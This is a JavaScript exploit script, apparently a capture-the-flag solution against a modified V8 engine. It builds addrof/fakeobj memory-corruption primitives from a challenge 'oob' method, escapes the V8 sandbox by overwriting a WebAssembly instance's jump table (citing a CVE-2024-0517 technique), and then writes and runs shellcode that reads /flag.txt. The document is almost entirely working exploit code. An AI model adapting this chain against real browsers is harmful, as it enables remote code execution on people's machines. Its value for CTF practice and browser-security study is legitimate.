// initial exploitation is derived from https://blog.joshdabo.sh/2021/04/14/picoctf-horsepower/

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function hex(val){
    return "0x"+val.toString(16);
}

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}


obj_array = [{}, 2.2];
float_array = [3.3, 4.4];

off = 15;

obj_array.oob(20);
float_array.oob(50);

function addrof(obj){
    obj_array[off] = obj;
    return ftoi(float_array[0]) & 0xffffffffn;
}


function fakeobj(addr){
    float_array[0] = itof(addr);
    return obj_array[off];
}


console.log("addrof({})", hex(addrof({})));

float_map = ftoi(float_array[2]) & 0xffffffffn;

console.log("float_array map", hex(float_map));


heap_rw = [itof(float_map), itof((4n << 32n) + 0x69696969n)];

console.log("addrof(heap_rw)", hex(addrof(heap_rw)));

function read_u64_sandboxed(addr){
    if (addr % 2n == 0){
        addr += 1n;
    }
    heap_rw[1] = itof((4n << 32n) + addr-8n);
    let fake = fakeobj(addrof(heap_rw) + 60n + 8n);
    return ftoi(fake[0]);
}



function write_u64_sandboxed(addr, data){
    if (addr % 2n == 0){
        addr += 1n
    }
    heap_rw[1] = itof((4n << 32n) + addr-8n)
    let fake = fakeobj(addrof(heap_rw) + 60n + 8n)
    fake[0] = itof(data)
}


// sandbox escape is https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/

const JUMP_TABLE_START_OFFSET = 0x50n; // offset of jump_table_start from WasmInstance

var rw_instance = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,0x01,0x60,0x02,0x7e,0x7e,0x01,0x7e,0x03,0x02,0x01,0x00,0x07,0x05,0x01,0x01,0x66,0x00,0x00,0x0a,0x0e,0x01,0x0c,0x00,0x42,0x90,0xa1,0xc2,0x84,0x89,0xa9,0xa2,0x88,0x43,0x0b,0x00,0x0a,0x04,0x6e,0x61,0x6d,0x65,0x02,0x03,0x01,0x00,0x00])));
console.log("addrof(rw_instance) = ", hex(addrof(rw_instance)));

let jump_table_start_slot = addrof(rw_instance) + JUMP_TABLE_START_OFFSET;
let jump_table_start = read_u64_sandboxed(jump_table_start_slot);
write_u64_sandboxed(jump_table_start_slot, jump_table_start + 0x761n);
console.log("jump_table_start = ", hex(jump_table_start));

// theres some weird caching stuff going on so modifying the jump_table_start address only works once
// writing our shellcode at the start seems to work tho
rw_instance.exports.f(jump_table_start,0xc310894890909090n);

var rce_instance = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,0x03,0x02,0x01,0x00,0x07,0x07,0x01,0x03,0x72,0x63,0x65,0x00,0x00,0x0a,0x06,0x01,0x04,0x00,0x20,0x00,0x0b,0x00,0x0a,0x04,0x6e,0x61,0x6d,0x65,0x02,0x03,0x01,0x00,0x00])));

let rwx_offset = 0x7b0n; // computed by VIBES (offset into the jump table that was all zeroed)


function write_u64_unsandboxed(addr, data) {
    console.log(`writing ${hex(data)} to ${hex(addr)}`)
    rw_instance.exports.f(addr, data);
}


// just shellcode; reads /flag.txt
write_u64_unsandboxed(jump_table_start + rwx_offset + BigInt(6*8), 0x9090909090feeb05n);
write_u64_unsandboxed(jump_table_start + rwx_offset + BigInt(5*8), 0xf995f016a58286an);
write_u64_unsandboxed(jump_table_start + rwx_offset + BigInt(4*8), 0xc689487fffffffban);
write_u64_unsandboxed(jump_table_start + rwx_offset + BigInt(3*8), 0x41050ff631e78948n);
write_u64_unsandboxed(jump_table_start + rwx_offset + BigInt(2*8), 0x58026a5078742e67n);
write_u64_unsandboxed(jump_table_start + rwx_offset + BigInt(1*8), 0x616c662fb848746an);
write_u64_unsandboxed(jump_table_start + rwx_offset + BigInt(0*8), 0x9090909090909090n);

write_u64_sandboxed(addrof(rce_instance) + JUMP_TABLE_START_OFFSET, jump_table_start + rwx_offset);
rce_instance.exports.rce(0);


